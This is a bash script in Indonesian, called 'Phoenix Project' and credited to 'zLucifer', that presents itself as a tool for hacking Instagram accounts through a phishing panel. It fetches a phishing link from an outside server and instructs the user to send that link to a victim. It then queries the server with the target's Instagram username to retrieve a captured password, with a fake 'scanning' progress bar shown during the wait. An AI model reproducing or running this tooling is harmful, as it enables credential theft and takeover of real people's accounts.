#!/bin/bash
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#////                       _            _  __                              ////
#////                      | |          (_)/ _|                             ////
#////                   ___| |_   _  ___ _| |_ ___ _ __                     ////
#////                  |_  / | | | |/ __| |  _/ _ \ '__|                    ////
#////                   / /| | |_| | (__| | ||  __/ |                       ////
#////                  /___|_|\__,_|\___|_|_| \___|_|                       ////
#////                                                                       ////
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
echo "Selamat datang kak, Siapa nick kaka?" #tulisan keluar
read nick #membaca yang ditulis
echo "                         ______ "
sleep 0.03
echo "              ______,---'__,---' "
sleep 0.03
echo "          _,-'---_---__,---' "
sleep 0.03
echo "   /_    (,  ---____', "
sleep 0.03
echo "  /  ',,   ', ,-' "
sleep 0.03
echo " ;/)   ,',,_/,' "
sleep 0.03
echo " | /\   ,.'//\ "
sleep 0.03
echo " '-' \ ,,'    '. "
sleep 0.03
echo "      '',   ,-- '. "
sleep 0.03
echo "      '/ / |      ',         _ "
sleep 0.03
echo "      //'',.\_    .\\      ,{==>- "
sleep 0.03
echo "   __//   __;_'-  \ ';.__,;' "
sleep 0.03
echo " ((,--,) (((,------;  '--' "
sleep 0.03
echo " '''  '   ''' "
sleep 0.03
echo "================================"
sleep 2
echo "==      Phoenix Project       =="
sleep 0.7
echo "================================"
echo " Phoenix Project adalah tools untuk"
echo " Hacking Instagram via Phising Panel"
get_url=$(curl -s http://zlucifer.com/api/phoenix_api_1.php)
get_url2=$(curl -s http://zlucifer.com/api/phoenix_api_2.php)
cek='curl -s '$get_url2 # check status
zlucifer="user-agent: zlucifer"
response=`curl -H "$zlucifer" -s -o /dev/null -w "%{http_code}" $cek`
#echo $response
if [[ $response != *302* ]]; then
    echo
    echo "Website Offline/Restart untuk sementara"
else
    echo
    echo
    echo "Cara penggunaan :"
    echo "1. Copy link ini : $get_url2"
    echo "2. Kirim link yang sudah di copy ke target"
    echo "3. Jika korban sudah terkena bisa langsung di cek"
    echo 
    echo "Mau melakukan cek target?"
    echo "y/n?"
    read confirm
    if [ $confirm = "y" ]; then
            echo "Silahkan masukan username Instagram target"
            echo "contoh hack.id_"
            read target # masukin user instagram
            echo
            echo "Apakah username $target sudah benar?"
            echo y/n?
            read confirm
        echo
        if [ $confirm = "y" ]; then
                echo Melakukan pencarian password username : $target
                i=0
                   max=100
                while [ $i -le $max ]; do
                echo -ne "\nScanning percentage : $i% "
                sleep 0.03
                if [ $i -eq 100 ]; then
                    echo -ne " [complete!]\n"
                    echo "Jangan close aplikasi sebelum scan selesai"            
                    echo "========================================"
                cek_target=`curl -s $get_url/instagram_phoenix.php?cari=$target`
                    echo -e $cek_target
            echo "======================================="
                    echo " Gunakan tools dengan bijak"
                    echo " -zLucifer"
                    echo "======================================="
                    fi
                    let i++
                    done
            else
                    echo "Kesalahan"
            fi            
    else
            echo "Terimakasih sudah menggunakan Phoenix Project"
    fi
fi
